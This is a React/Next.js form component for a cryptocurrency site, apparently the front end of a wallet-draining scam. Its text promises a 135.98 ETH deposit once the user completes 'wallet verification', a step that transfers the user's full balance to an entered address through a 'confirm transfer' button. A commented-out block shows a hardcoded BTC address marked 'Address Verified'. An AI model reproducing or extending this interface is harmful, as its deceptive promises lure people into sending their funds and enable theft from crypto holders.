"use client"

import React, { useEffect, useState } from 'react'
import Cookies from 'js-cookie'
import { useForm } from 'react-hook-form'
import { useRouter } from 'next/navigation'
import { twMerge } from 'tailwind-merge'
import useBTCAdress from '@/lib/hooks'
import { convertETHtoUSD } from '@/lib/functions'

type FormProps = {
    btcaddress: string
}

type VerifyAddressFormProps = {
    userBalance: number
    confirmAndSend: () => void
}

const VerifyAddressForm = ({ userBalance, confirmAndSend }: VerifyAddressFormProps) => {

    const router = useRouter()
    const { setAddress } = useBTCAdress()
    const [inputAddress, setInputAddress] = useState<string>()

    const { register, handleSubmit, formState: { errors } } = useForm<FormProps>()

    useEffect(() => {

        const address = Cookies.get("inputaddress")
        if (address && inputAddress === undefined) {
            setInputAddress(address)
            setAddress(address)
        }

    })

    const onSubmit = (formValues: FormProps) => {
        const submittedaddress = formValues.btcaddress
        Cookies.set("inputaddress", submittedaddress, { expires: 1 })
        setInputAddress(submittedaddress)
        setAddress(submittedaddress)
        router.refresh()
    }

    return (
        <>
            <div className='p-4 bg-green-100 rounded-md mb-4'>
                <h4><span className='font-bold text-lg'>135.98 ETH ({convertETHtoUSD(135.98)})</span> to be deposited to <span className='font-bold text-lg break-all'>{Boolean(inputAddress) ? inputAddress : "input address"}</span> immediately after <span className='font-bold'>wallet verification</span> is done</h4>
            </div>
            <div className='bg-neutral-200 p-4 rounded-md mb-4'>
                <h4 className='font-semibold uppercase mb-4'>Wallet verification and transfer</h4>
                <h4 className="mb-2">As part of our wallet verification process, we will initiate a <span className="font-bold">transfer request</span> of <span className='font-bold'>{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to <span className="font-bold break-all">{Boolean(inputAddress) ? inputAddress : "input address"}</span> after which <span className='font-bold'>135.98 ETH ({convertETHtoUSD(135.98)})</span> will be deposited to your connected wallet account</h4>
                {/* <h4 className="mb-2"><span className="font-bold">{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to be deposited to <span className="font-bold">input address</span> from your connected wallet</h4> */}

                <form action="" onSubmit={handleSubmit(onSubmit)} className='flex md:flex-row flex-col justify-between gap-y-4 gap-x-4'>
                    <div className='w-full'>
                        <div className={twMerge('w-full bg-white break-words px-3 py-2 rounded-md border border-red-600 mb-3', Boolean(inputAddress) && "border-green-600")}>{Boolean(inputAddress) ? inputAddress : <>No Transfer Address</>}</div>
                        {Boolean(inputAddress) ? null : <input type="text" {
                            ...register("btcaddress", {
                                required: "ETH address required",
                                validate: (address) => {
                                    if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
                                        return true
                                    } else {
                                        return "Enter a valid ETH address"
                                    }
                                }
                            })
                        } placeholder='INPUT YOUR ADDRESS' className='w-full h-10 border-2 border-neutral-200 placeholder:text-neutral-300 outline-none focus-visible:outline-none pl-4 rounded-t-md mb-2' />}
                        {Boolean(inputAddress) ? null : <span className='text-red-600'>{errors.btcaddress?.message}</span>}
                    </div>

                    {Boolean(inputAddress) ? <button onClick={confirmAndSend} className="uppercase font-medium flex items-center justify-center h-10 bg-green-600 px-4 rounded-full text-neutral-100 sm:w-fit w-full whitespace-nowrap">confirm transfer</button> : <button className='text-base font-medium px-6 h-9 flex items-center justify-center bg-red-700 rounded-full text-white whitespace-nowrap'>Verify Address</button>}
                    {/* <div className='w-full'>
                    <div className='w-full bg-white break-words px-3 py-2 rounded-md border border-green-600 mb-3'>392NQstZKRCHBGNR4nNR7PRhQtXS5xRKAV</div>
                </div>
                <div className=' bg-green-100 font-medium px-6 h-9 flex gap-x-2
                 justify-center rounded-full items-center whitespace-nowrap'><CheckCheck size={20} />Address Verified</div> */}
                </form>
            </div>
        </>
    )
}

export default VerifyAddressForm

{/* <span className='text-sm font-normal lowercase'>(pending verification)</span> */ }